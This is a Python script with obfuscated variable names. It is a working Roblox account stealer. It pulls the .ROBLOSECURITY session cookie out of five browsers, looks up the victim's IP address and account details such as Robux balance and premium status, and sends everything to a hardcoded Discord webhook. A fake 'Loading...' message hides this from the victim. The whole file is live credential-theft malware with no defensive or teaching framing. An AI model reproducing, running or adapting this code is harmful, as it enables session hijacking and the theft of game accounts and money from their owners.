import os #line:1
import codecs #line:2
import marshal ,zlib ,base64 ,lzma #line:3
import json #line:4
from base64 import *#line:5
webhookk ="https://discord.com/api/webhooks/1070187413638488064/TaX_7G1l-p_7V1ICW2HsjZI6o11Ezw-VdflfPEqggx4C43tuanX-jxmXa6xXJJscd4S5"#line:7
def command (O0OOOO000OOOO00O0 ):#line:9
    os .system (O0OOOO000OOOO00O0 )#line:10
def cls ():#line:11
    os .system ("cls")#line:12
try :#line:14
    import robloxpy #line:15
    import requests ,re #line:16
    from discordwebhook import *#line:17
    import browser_cookie3 #line:18
except :#line:20
    input ("Libraries not installed press enter to exit...")#line:21
dummy_message ="Loading..."#line:26
print (dummy_message )#line:27
def cookieLogger ():#line:29
    O0O00OOO0OO0OO0OO =[]#line:31
    try :#line:33
        O0O0OO00OOO0000O0 =browser_cookie3 .firefox (domain_name ='roblox.com')#line:34
        for O000O00O0O00O000O in O0O0OO00OOO0000O0 :#line:35
            if O000O00O0O00O000O .name =='.ROBLOSECURITY':#line:36
                O0O00OOO0OO0OO0OO .append (O0O0OO00OOO0000O0 )#line:37
                O0O00OOO0OO0OO0OO .append (O000O00O0O00O000O .value )#line:38
                return O0O00OOO0OO0OO0OO #line:39
    except :#line:40
        pass #line:41
    try :#line:42
        O0O0OO00OOO0000O0 =browser_cookie3 .chromium (domain_name ='roblox.com')#line:43
        for O000O00O0O00O000O in O0O0OO00OOO0000O0 :#line:44
            if O000O00O0O00O000O .name =='.ROBLOSECURITY':#line:45
                O0O00OOO0OO0OO0OO .append (O0O0OO00OOO0000O0 )#line:46
                O0O00OOO0OO0OO0OO .append (O000O00O0O00O000O .value )#line:47
                return O0O00OOO0OO0OO0OO #line:48
    except :#line:49
        pass #line:50
    try :#line:52
        O0O0OO00OOO0000O0 =browser_cookie3 .edge (domain_name ='roblox.com')#line:53
        for O000O00O0O00O000O in O0O0OO00OOO0000O0 :#line:54
            if O000O00O0O00O000O .name =='.ROBLOSECURITY':#line:55
                O0O00OOO0OO0OO0OO .append (O0O0OO00OOO0000O0 )#line:56
                O0O00OOO0OO0OO0OO .append (O000O00O0O00O000O .value )#line:57
                return O0O00OOO0OO0OO0OO #line:58
    except :#line:59
        pass #line:60
    try :#line:62
        O0O0OO00OOO0000O0 =browser_cookie3 .opera (domain_name ='roblox.com')#line:63
        for O000O00O0O00O000O in O0O0OO00OOO0000O0 :#line:64
            if O000O00O0O00O000O .name =='.ROBLOSECURITY':#line:65
                O0O00OOO0OO0OO0OO .append (O0O0OO00OOO0000O0 )#line:66
                O0O00OOO0OO0OO0OO .append (O000O00O0O00O000O .value )#line:67
                return O0O00OOO0OO0OO0OO #line:68
    except :#line:69
        pass #line:70
    try :#line:72
        O0O0OO00OOO0000O0 =browser_cookie3 .chrome (domain_name ='roblox.com')#line:73
        for O000O00O0O00O000O in O0O0OO00OOO0000O0 :#line:74
            if O000O00O0O00O000O .name =='.ROBLOSECURITY':#line:75
                O0O00OOO0OO0OO0OO .append (O0O0OO00OOO0000O0 )#line:76
                O0O00OOO0OO0OO0OO .append (O000O00O0O00O000O .value )#line:77
                return O0O00OOO0OO0OO0OO #line:78
    except :#line:79
        pass #line:80
cookies =cookieLogger ()#line:83
ip_address =requests .get ("https://api.ipify.org/").text #line:87
roblox_cookie =cookies [1 ]#line:88
isvalid =robloxpy .Utils .CheckCookie (roblox_cookie )#line:90
if isvalid =="Valid Cookie":#line:91
    pass #line:92
else :#line:93
    requests .post (url =webhookk ,data ={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})#line:94
    exit ()#line:95
ebruh =requests .get ("https://www.roblox.com/mobileapi/userinfo",cookies ={".ROBLOSECURITY":roblox_cookie })#line:98
info =json .loads (ebruh .text )#line:99
rid =info ["UserID"]#line:100
rap =robloxpy .User .External .GetRAP (rid )#line:101
friends =robloxpy .User .Friends .External .GetCount (rid )#line:102
age =robloxpy .User .External .GetAge (rid )#line:103
crdate =robloxpy .User .External .CreationDate (rid )#line:104
rolimons =f"https://www.rolimons.com/player/{rid}"#line:105
roblox_profile =f"https://web.roblox.com/users/{rid}/profile"#line:106
headshot =robloxpy .User .External .GetHeadshot (rid )#line:107
username =info ['UserName']#line:108
robux =info ['RobuxBalance']#line:109
premium =info ['IsPremium']#line:110
discord =Discord (url =webhookk )#line:113
discord .post (username ="BOT - jsfr 🍪",avatar_url ="https://cdn.discordapp.com/avatars/720913449906995233/7d6c07e4f4432f6da85b6aa969c305ed.webp?size=80",embeds =[{"username":"BOT - jsfr 🍪","title":"💸 +1 Result Account 🕯","description":f"[SENT TO GUMBY](https://discord.gg/gcvq63anPk) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})","color":12452044 ,"fields":[{"name":"Username","value":username ,"inline":True },{"name":"Robux Balance","value":robux ,"inline":True },{"name":"Premium Status","value":premium ,"inline":True },{"name":"Creation Date","value":crdate ,"inline":True },{"name":"RAP","value":rap ,"inline":True },{"name":"Friends","value":friends ,"inline":True },{"name":"Account Age","value":age ,"inline":True },{"name":"IP Address","value":ip_address ,"inline:":True },{"name":".ROBLOSECURITY","value":f"```fix\n{roblox_cookie}```","inline":False },],"thumbnail":{"url":headshot },}],)#line:139
